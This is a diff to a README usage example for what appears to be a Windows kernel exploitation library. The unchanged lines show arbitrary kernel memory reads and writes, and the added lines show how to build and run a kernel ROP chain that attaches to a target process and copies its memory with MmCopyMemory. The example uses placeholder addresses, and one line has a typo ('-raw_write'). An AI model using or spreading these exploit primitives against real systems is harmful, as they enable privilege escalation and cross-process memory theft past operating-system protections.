@@ -56,6 +56,27 @@ auto dosHeader = collat::kernel::get_ioring()->raw_read<IMAGE_DOS_HEADER>(KERNEL
 char null[0x10] = { 0 };
 collat::kernel::get_ioring()-raw_write<char[0x10]>(ADDRESS, &null);
 
+// Creating and executing a ROP chain with multiple functions
+void* ApcState;
+void* TargetProcess; // Placeholder
+size_t BytesTransferred;
+NTSTATUS status;
+bool result = collat::rop::RopChain()
+    .call("ntoskrnl.exe", "KeStackAttachProcess", {TargetProcess, &ApcState}, nullptr)
+    .call("ntoskrnl.exe", 
+        "MmCopyMemory",
+        { // arugments
+            0xDEADBEEF,            // TargetAddress
+            0xCAFEBABE,            // SourceAddress
+            0x1000,                // NumberOfBytes
+            MM_COPY_MEMORY_VIRTUAL, // Flags
+            &BytesTransferred
+        },
+        &status
+    )
+    .call("ntoskrnl.exe", "KeUnstackDetachProcess", {&ApcState})
+    .execute();
+
 ``` 
 
 ## Contributing
